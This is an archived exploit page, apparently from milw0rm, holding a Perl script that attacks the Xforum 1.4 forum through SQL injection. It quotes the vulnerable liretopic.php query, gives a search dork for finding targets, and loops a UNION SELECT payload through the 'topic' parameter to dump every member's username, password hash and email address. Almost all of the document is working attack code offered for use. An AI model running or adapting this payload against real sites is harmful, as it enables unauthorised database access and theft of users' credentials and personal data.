<html><head><title>Xforum 1.4 (topic) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#######################################################
#
# Xforum 1.4 Remote SQL Injection
# desc: Un forum php/MySQL, avec gestion complete des membres et des messages
# download: http://www.comscripts.com/scripts/php.xforum.1188.html
# d0rk: &quot;xforum 1.4&quot;
# bug found by j0j0
# c0ded by j0j0
#
# liretopic.php
# 68.       $conn = connect();
# 69.       $requete = &quot;SELECT titre,closed,place,cara FROM topic WHERE numero=&quot;.$_GET['topic'].&quot; AND categorie=&quot;.$_GET['categorie'];
# 70.       $res = mysql_query($requete) or    die(mysql_error());
# 71.       $proptopic = mysql_fetch_row($res);
#
#######################################################

use LWP::UserAgent;
use HTTP::Request::Common;
$lwp = new LWP::UserAgent;

$host = $ARGV[0];

print q{
----------------------------------------------
      .: Xforum 1.4 Remote SQL Injection :.
----------------------------------------------
  c0ded by: j0j0
  download: http://www.comscripts.com/scripts/php.xforum.1188.html
  desc: Un forum php/MySQL, avec gestion complete des membres et des messages
  d0rk: &quot;xforum 1.4&quot;
----------------------------------------------
};
 
if(!$ARGV[0]) {
    print &quot;[*] Usage: perl $0 [HOST]\n&quot;;
    print &quot;[*] Example: perl $0 http://mysite.com/forum\n&quot;;
    exit(1);
}
 
print &quot;\n[*] Connecting to $host...\n&quot;;
$i=0;
while(true) {
    $go=$lwp-&gt;get($host.&quot;/liretopic.php?categorie=1&amp;topic=-1/**/UNION/**/SELECT/**/CONCAT(0x21232321,pseudo,char(58),pass,char(58),mail,0x21232321),1,2,3/**/FROM/**/inscrit/**/LIMIT/**/$i,100000/**//*&amp;nbpage=1&amp;nbpageliste=1&quot;);
    if($go-&gt;content =~ m/!##!(.*?)!##!/ms) {
        @res = split(/:/, $1);
        $res[1] = substr($res[1], 0, 32);
        print &quot;\n[+] Username : $res[0]\n&quot;;
        print &quot;[+] Password : $res[1]\n&quot;;
        if($res[2] =~ /(.*?)@(.*?)/) {
            print &quot;[+] Mail : $res[2]\n&quot;;
        }
        $i++;
    }
    else {
        if($i == 0) {
            print &quot;[-] Exploit failed\n&quot;;
        }
        exit(1);
    }
}

# milw0rm.com [2008-01-14]</pre></html>